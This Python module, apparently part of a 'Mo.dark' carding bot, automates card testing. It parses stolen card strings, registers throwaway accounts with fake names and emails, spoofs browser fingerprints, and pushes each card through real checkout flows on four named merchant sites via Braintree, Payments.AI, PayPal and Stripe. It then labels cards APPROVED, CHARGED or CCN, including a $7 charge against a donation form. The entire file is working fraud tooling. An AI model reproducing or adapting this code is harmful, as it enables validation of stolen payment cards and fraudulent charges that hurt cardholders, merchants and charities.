# ==================== gateways.py v11.0 ====================
# Mo.dark Engineering v7.0 - UESM Mode
# 4 Gateways: Braintree + Payments.AI + PayPal + Stripe

import requests, random, re, json, uuid, string, base64
import user_agent
from faker import Faker
from config import *

# ═══════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════

def reg(cc):
    regex = r'\d+'; matches = re.findall(regex, cc); match = ''.join(matches)
    n = match[:16]; mm = match[16:18]; yy = match[18:20]
    if yy == '20': yy = match[18:22]
    if n.startswith("3"): cvc = match[22:26] if yy == '20' or len(match) > 20 else match[20:24]
    else: cvc = match[22:25] if yy == '20' or len(match) > 20 else match[20:23]
    cc = f"{n}|{mm}|{yy}|{cvc}"
    if not re.match(r'^\d{16}$', n): return None
    if not re.match(r'^\d{3,4}$', cvc): return None
    return cc

def extract_cc(text):
    """استخراج جميع البطاقات من النص"""
    cards = []
    lines = text.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line: continue
        card = reg(line)
        if card: cards.append(card)
    return cards

def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/" + zh, timeout=5).json()
        return f"[ϟ] Bin: <code>{api_url['brand']} - {api_url['type']} - {api_url['level']}</code>\n[ϟ] Bank: <code>{api_url['bank']} - {api_url['country_flag']}</code>\n[ϟ] Country: <code>{api_url['country_name']} [ {api_url['country_flag']} ]</code>"
    except: return '<b>No BIN Info</b>'

def get_card_type(c): return {'3':'AMEX','4':'VISA','5':'MASTERCARD','6':'DISCOVER'}.get(c[0],'UNKNOWN')

def generate_email():
    first = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
    last = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
    dom = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
    f = random.choice(first); l = random.choice(last); n = random.randint(10, 9999)
    patterns = [f"{f}.{l}{n}", f"{f}{l}{n}", f"{f}_{l}{n}", f"{f}{n}", f"{l}.{f}{n}", f"{f}{l}.{n}", f"{f}.{l}.{n}", f"{f}{random.randint(1980, 2005)}"]
    return f"{random.choice(patterns)}@{random.choice(dom)}".lower()

# ═══════════════════════════════════════════════════════════════
# GATEWAY 1: Braintree (dnalasering.com) - Auth
# ═══════════════════════════════════════════════════════════════

def xst_bt_dna(P):
    try:
        n = P.split('|')[0]; mm = P.split('|')[1]
        yy = P.split('|')[2]; cvc = P.split('|')[3].replace('\n', '')
        if len(yy) == 2: yy = '20' + yy
    except: return 'Invalid Card Number'
    
    f = Faker(); name = f.name(); e = generate_email(); u = user_agent.generate_user_agent(); r = requests.Session()
    
    # Step 1: Get register nonce
    response = r.get('https://www.dnalasering.com/my-account/', headers={'User-Agent': u})
    x = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', response.text)
    xp = x.group(1) if x else ''
    
    # Step 2: Register
    data = {
        'email': e,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://www.dnalasering.com/my-account/payment-methods/',
        'wc_order_attribution_session_start_time': '2026-05-27 03:41:14',
        'wc_order_attribution_session_pages': '3',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': u,
        'woocommerce-register-nonce': xp,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    response = r.post('https://www.dnalasering.com/my-account/', headers={
        'authority': 'www.dnalasering.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.dnalasering.com',
        'referer': 'https://www.dnalasering.com/my-account/',
        'user-agent': u,
    }, data=data)
    
    # Step 3: Edit billing address
    response = r.get('https://www.dnalasering.com/my-account/edit-address/billing/', headers={'User-Agent': u})
    xxl = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', response.text)
    xxp = xxl.group(1) if xxl else ''
    
    headers = {
        'authority': 'www.dnalasering.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.dnalasering.com',
        'referer': 'https://www.dnalasering.com/my-account/edit-address/billing/',
        'user-agent': u,
    }
    data = {
        'billing_first_name': name,
        'billing_last_name': name,
        'billing_company': '',
        'billing_country': 'US',
        'billing_address_1': 'Hollow park city 49',
        'billing_address_2': '',
        'billing_city': 'New york',
        'billing_state': 'NY',
        'billing_postcode': '10080',
        'billing_phone': '3164394561',
        'billing_email': e,
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': xxp,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }
    response = r.post('https://www.dnalasering.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
    
    # Step 4: Get payment method nonce
    site = r.get('https://www.dnalasering.com/my-account/add-payment-method/', headers={'User-Agent': u})
    xox = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', site.text)
    xoxp = xox.group(1) if xox else ''
    
    wwp = re.search(r'client_token_nonce":"([^"]+)"', site.text)
    if not wwp:
        wwp = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)\\u0022', site.text)
    xpython = wwp.group(1) if wwp else ''
    
    ajax_data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': xpython}
    ajax_resp = r.post('https://www.dnalasering.com/wp-admin/admin-ajax.php',
        headers={'User-Agent': u, 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://www.dnalasering.com',
                 'Referer': 'https://www.dnalasering.com/my-account/add-payment-method/'}, data=ajax_data)
    
    try:
        decoded = base64.b64decode(ajax_resp.json()['data']).decode('utf-8')
        auth_fingerprint = json.loads(decoded).get('authorizationFingerprint')
    except: return 'Fingerprint Failed'
    
    # Step 5: Tokenize card
    json_graphql = {
        'clientSdkMetadata': {'source': 'client', 'integration': 'custom'},
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
        'variables': {'input': {'creditCard': {'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc}, 'options': {'validate': False}}},
        'operationName': 'TokenizeCreditCard'
    }
    
    response = r.post('https://payments.braintree-api.com/graphql', headers={
        'authority': 'payments.braintree-api.com',
        'authorization': f'Bearer {auth_fingerprint}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': u,
    }, json=json_graphql)
    
    try:
        data = response.json()
        cvv = data['data']['tokenizeCreditCard']['token']
    except:
        try: return f"DECLINED: {response.json().get('errors', [{}])[0].get('message', '')[:50]}"
        except: return 'Braintree Tokenize Failed'
    
    # Step 6: Add payment method
    headers = {
        'authority': 'www.dnalasering.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.dnalasering.com',
        'referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': u,
    }
    data = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'visa'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
        ('wc_braintree_credit_card_payment_nonce', cvv),
        ('wc_braintree_device_data', '{}'),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        ('wc_braintree_paypal_payment_nonce', ''),
        ('wc_braintree_device_data', '{}'),
        ('wc-braintree-paypal-context', 'shortcode'),
        ('wc_braintree_paypal_amount', '0.00'),
        ('wc_braintree_paypal_currency', 'USD'),
        ('wc_braintree_paypal_locale', 'en_us'),
        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', xoxp),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]
    
    response = r.post('https://www.dnalasering.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
    
    wx = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', response.text, re.DOTALL)
    if wx:
        wxx = re.sub(r'<[^>]+>', '', wx.group(1)).strip()
        if 'success' in response.text.lower() or 'payment method' in response.text.lower():
            return 'APPROVED'
        return f'DECLINED: {wxx[:50]}'
    
    if 'success' in response.text.lower() or 'payment method' in response.text.lower():
        return 'APPROVED'
    return 'DECLINED'

# ═══════════════════════════════════════════════════════════════
# GATEWAY 2: Payments.AI (clickfunnels.com) - Charge
# ═══════════════════════════════════════════════════════════════

def xst_payments_ai(P):
    try:
        n = P.split('|')[0]; mm = P.split('|')[1]
        yy = P.split('|')[2]; cvc = P.split('|')[3].replace('\n', '')
        if len(yy) == 2: yy = '20' + yy
    except: return 'Invalid Card Number'
    
    x = Faker(); name = x.name(); e = generate_email(); u = user_agent.generate_user_agent(); r = requests.Session()
    
    # Step 1: Cometly tracking
    headers = {
        'authority': 't.cometlytrack.com',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.clickfunnels.com',
        'referer': 'https://www.clickfunnels.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': u,
    }
    params = {'space_id': '3377699765000018'}
    json_data = {
        'fingerprint': '09207158521d4a5ca00896c0e024f2f3',
        'comet_token': '2942493487149889343233890852493992791010990969429',
        'event': 'phone_changed',
        'json_data': {'phone': '07 58 83 99 29'},
        'url': 'https://www.clickfunnels.com/scale-monthly-step-2',
        'referrer': 'https://www.clickfunnels.com/scale-monthly-step-1',
        'fbp': 'fb.1.1780439334199.14120841984468307',
        'device_type': 'mobile',
        'os': 'Android',
        'browser': None,
        'language': 'fr-FR',
        'in_iframe': False,
    }
    r.post('https://t.cometlytrack.com/e/t', params=params, headers=headers, json=json_data)
    
    # Step 2: Create token
    headers = {
        'authority': 'api-order.payments.ai',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {PAYMENTS_AI_KEY}',
        'content-type': 'application/json',
        'origin': 'https://framepay.payments.ai',
        'reb-api-consumer': 'Rebilly/framepay@framepay.payments.ai_48f95c8',
        'referer': 'https://framepay.payments.ai/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': u,
    }
    json_data = {
        'method': 'payment-card',
        'billingAddress': {
            'firstName': name,
            'lastName': name,
            'emails': [{'label': 'Emails', 'value': e}],
        },
        'riskMetadata': {
            'fingerprint': '6c7e7f14406ffcfa0003606def35f4e5',
            'extraData': {'kountFraudSessionId': '5e427901a1684fc794d2863982ef898d'},
            'browserData': {
                'colorDepth': 24,
                'isJavaEnabled': False,
                'language': 'fr-FR',
                'screenHeight': 889,
                'screenWidth': 400,
                'timeZoneOffset': -120,
                'isAdBlockEnabled': False,
            },
        },
        'leadSource': {'path': 'https://www.clickfunnels.com/scale-monthly-step-2'},
        'paymentInstrument': {
            'pan': n,
            'cvv': cvc,
            'expYear': yy,
            'expMonth': mm,
        },
    }
    response = r.post(f'https://api-order.payments.ai/organizations/{PAYMENTS_AI_ORG}/tokens', headers=headers, json=json_data)
    
    try:
        uwu = response.json()['id']
    except:
        try: return f"DECLINED: {response.json().get('message', 'Token Failed')[:50]}"
        except: return 'Token Creation Failed'
    
    # Step 3: Submit order
    headers = {
        'authority': 'www.clickfunnels.com',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.clickfunnels.com',
        'referer': 'https://www.clickfunnels.com/scale-monthly-step-2',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': u,
        'x-cf2-post-type': 'submit',
    }
    json_data = {
        'billing_same_as_shipping': True,
        'product': True,
        'contact': {
            'email': e,
            'phone_number': '+33758839929',
            'first_name': name,
            'last_name': name,
        },
        'billing_address_attributes': {
            'city': None,
            'region_name': None,
            'country_id': 'FR',
            'postal_code': '10080',
        },
        'purchase': {
            'product_variants': [
                {'id': '4177901', 'quantity': 1, 'price_id': '3820654'},
                {'id': '119714', 'quantity': 1, 'price_id': '1298890'},
            ],
            'payment_method_id': None,
            'payment_method_type': 'payment-card',
            'rebilly_token': uwu,
            'process_new_order': True,
        },
        'skip_billing_address': False,
        'skip_optin_track': False,
        'redirect_to': '/onboarding-calls',
    }
    response = r.post('https://www.clickfunnels.com/scale-monthly-step-2', cookies=r.cookies, headers=headers, json=json_data)
    
    text = response.text
    if 'APPROVED' in text or 'success' in text.lower() or 'order' in text.lower():
        return 'CHARGED'
    elif 'declined' in text.lower():
        return 'DECLINED'
    elif 'insufficient' in text.lower():
        return 'INSUFFICIENT'
    elif 'ccn' in text.lower() or 'cvc' in text.lower():
        return 'CCN'
    return 'DECLINED'

# ═══════════════════════════════════════════════════════════════
# GATEWAY 3: PayPal 7$ (brasscheck.com) - Charge
# ═══════════════════════════════════════════════════════════════

def xst_paypal_brass(P):
    try:
        n = P.split('|')[0]; mm = P.split('|')[1]
        yy = P.split('|')[2]; cvc = P.split('|')[3].replace('\n', '')
        if len(yy) == 2: yy = '20' + yy
    except: return 'Invalid Card Number'
    
    x = Faker(); name = x.name(); e = generate_email(); u = user_agent.generate_user_agent(); r = requests.Session()
    
    # Step 1: Get form data
    resp = r.get(PAYPAL_BRASS_URL, headers={'User-Agent': u})
    html = resp.text
    
    try:
        v1 = re.search(r'name="give-form-id-prefix" value="([^"]+)"', html).group(1)
        v2 = re.search(r'name="give-form-id" value="([^"]+)"', html).group(1)
        x1 = re.search(r'name="give-form-hash" value="([^"]+)"', html).group(1)
        x23 = re.search(r'"data-client-token":"([^"]+)"', html).group(1)
    except: return 'Form Data Not Found'
    
    x24 = base64.b64decode(x23).decode()
    x25 = json.loads(x24)
    x26 = x25['paypal']['accessToken']
    
    # Step 2: Create order
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.brasscheck.com',
        'Referer': 'https://www.brasscheck.com/video/donate/',
        'User-Agent': u,
        'X-Requested-With': 'XMLHttpRequest',
    }
    data = {
        'action': 'give_paypal_commerce_create_order',
        'give-honeypot': '',
        'give-form-id-prefix': v1,
        'give-form-id': v2,
        'give-form-title': 'One time donation',
        'give-current-url': 'https://www.brasscheck.com/video/donate/',
        'give-form-url': 'https://www.brasscheck.com/video/donate/',
        'give-form-minimum': '7',
        'give-form-maximum': '1000000',
        'give-form-hash': x1,
        'give-price-id': 'custom',
        'give-recurring-logged-in-only': '',
        'give-logged-in-only': '1',
        'give_recurring_donation_details': '{"is_recurring":false}',
        'give-amount': '7',
        'give-radio-donation-level': 'custom',
        'give_stripe_payment_method': '',
        'payment-mode': 'paypal-commerce',
        'give_first': name,
        'give_last': name,
        'give_company_option': 'no',
        'give_company_name': '',
        'give_email': e,
        'card_name': name,
        'billing_country': 'US',
        'card_address': 'New york 595',
        'card_address_2': '',
        'card_city': 'New york',
        'card_state': 'NY',
        'card_zip': '10080',
        'give-gateway': 'paypal-commerce',
    }
    response = r.post('https://www.brasscheck.com/video/wp-admin/admin-ajax.php', headers=headers, data=data)
    
    try:
        xdata = response.json()['data']['id']
    except: return 'Order Creation Failed'
    
    # Step 3: CORS preflight
    headers = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'access-control-request-headers': 'authorization,braintree-sdk-version,content-type,paypal-client-metadata-id',
        'access-control-request-method': 'POST',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': u,
    }
    r.options(f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source', headers=headers)
    
    # Step 4: Confirm payment source
    headers = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {x26}',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': u,
    }
    json_data = {
        'payment_source': {
            'card': {
                'number': n,
                'expiry': f'{yy}-{mm}',
                'security_code': cvc,
                'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
            },
        },
        'application_context': {'vault': False},
    }
    response = r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source', headers=headers, json=json_data)
    
    text = response.text
    if 'APPROVED' in text or 'COMPLETED' in text:
        return 'CHARGED 7.00$'
    elif 'INVALID_SECURITY_CODE' in text:
        return 'CCN - Invalid CVV'
    elif 'INSUFFICIENT_FUNDS' in text:
        return 'Insufficient Funds'
    elif 'DECLINED' in text:
        return 'Card Declined'
    elif 'RISK_DISALLOWED' in text:
        return 'Risk Disallowed'
    return 'DECLINED'

# ═══════════════════════════════════════════════════════════════
# GATEWAY 4: Stripe 0.00$ (ezycourse.com) - Auth
# ═══════════════════════════════════════════════════════════════

def xst_stripe_ezy(P):
    try:
        n = P.split('|')[0]; mm = P.split('|')[1]
        yy = P.split('|')[2]; cvc = P.split('|')[3].replace('\n', '')
        if len(yy) == 4: yy = yy[-2:]
    except: return 'Invalid Card Number'
    
    x = Faker(); u = user_agent.generate_user_agent(); r = requests.Session()
    
    # Step 1: Create payment method
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': u,
    }
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F19f3ad3143%3B+stripe-js-v3%2F19f3ad3143%3B+card-element&key={STRIPE_EZY_KEY}'
    
    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    try:
        uwu = response.json()['id']
    except:
        return 'Stripe Error'
    
    # Step 2: Create setup intent
    headers = {
        'authority': 'ezycourse.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://ezycourse.com',
        'referer': 'https://ezycourse.com/signup?plan=pro&interval=month&trial=true',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': u,
    }
    json_data = {
        'stripe_payment_method_uuid': uwu,
        'is_trial': True,
    }
    response = r.post('https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent', cookies=r.cookies, headers=headers, json=json_data)
    
    try:
        data = response.json()
        uwu2 = data['id']
        uwu3 = data['client_secret']
    except:
        return 'Setup Failed'
    
    # Step 3: Confirm setup intent
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': u,
    }
    data = f'expected_payment_method_type=card&use_stripe_sdk=true&key={STRIPE_EZY_KEY}&client_secret={uwu3}'
    
    response = r.post(f'https://api.stripe.com/v1/setup_intents/{uwu2}/confirm', headers=headers, data=data)
    
    text = response.text
    if 'succeeded' in text:
        return 'APPROVED'
    elif 'incorrect_cvc' in text:
        return 'CCN - Invalid CVV'
    elif 'declined' in text:
        return 'Card Declined'
    else:
        try: return response.json().get('error', {}).get('message', 'Declined')[:50]
        except: return 'Declined'
